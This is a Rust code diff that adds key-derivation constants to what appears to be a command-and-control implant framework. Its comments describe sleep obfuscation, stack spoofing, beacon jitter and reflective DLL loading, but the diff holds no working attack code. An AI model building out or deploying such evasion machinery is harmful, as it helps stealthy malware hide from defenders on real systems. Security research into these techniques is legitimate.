@@ -58,6 +58,33 @@ pub const REENCODE_SEED: &[u8] =
 pub const C2_PSK_DERIVATION: &[u8] =
     b"\x0c\xd3\xa7\x5f\x92\x18\xeb\x4c\x36\xbf\x60\x0d\x7a\xc1\x3e\x89";
 
+/// Thread-context encryption — XChaCha20-Poly1305 key derivation for
+/// encrypting register states (CONTEXT structs), stack pointers, and TLS
+/// data during sleep obfuscation.  Domain-separated from the region-encryption
+/// key so that a compromised per-region key does not leak thread contexts.
+pub const THREAD_CTX: &[u8] =
+    b"\x0d\x47\xb2\x8e\xc1\xf6\xa3\xd5\x72\xe9\x0b\x54\x8c\x3a\x6f\xd1";
+
+/// Trampoline-based stack spoofing — domain separation for the per-chain
+/// randomisation seed that determines which gadget sequence and frame layout
+/// the trampoline builder assembles.  Ensures the chain-selection PRNG seed
+/// is distinct from any other derived key.
+pub const TRAMPOLINE_SPOOF: &[u8] =
+    b"\x0e\x93\xc5\x4a\x71\x2d\x8e\xbf\x60\xa1\xd7\x38\xeb\x54\x0c\xf2";
+
+/// Adaptive C2 timing — domain separation for the PRNG seed used by the
+/// Gaussian jitter distribution and peak-hour scheduling algorithm.  Ensures
+/// the timing-model randomisation is distinct from any other derived key.
+pub const ADAPTIVE_TIMING: &[u8] =
+    b"\x0f\xa2\xd6\x7e\x4b\x13\x95\xc8\x3f\xe1\x56\x09\xd4\x82\x6b\x37";
+
+/// Reflective DLL loader — domain separation for the per-load randomised
+/// section name and cookie values used by NtCreateSection-based reflective
+/// loading.  Ensures the loader's randomisation is distinct from any other
+/// derived key.  The next available first-byte index is \x11.
+pub const REFLECTIVE_LOADER: &[u8] =
+    b"\x10\xb4\x7e\xf3\x92\xc5\x0d\xa8\x61\x3b\xd6\x4e\x8f\x2a\x17\xc9";
+
 /// Collect all info slices into a single array for uniqueness tests.
 #[cfg(test)]
 fn all_infos() -> Vec<&'static [u8]> {
@@ -74,6 +101,10 @@ fn all_infos() -> Vec<&'static [u8]> {
         SSP_SHM,
         REENCODE_SEED,
         C2_PSK_DERIVATION,
+        THREAD_CTX,
+        TRAMPOLINE_SPOOF,
+        ADAPTIVE_TIMING,
+        REFLECTIVE_LOADER,
     ]
 }
 
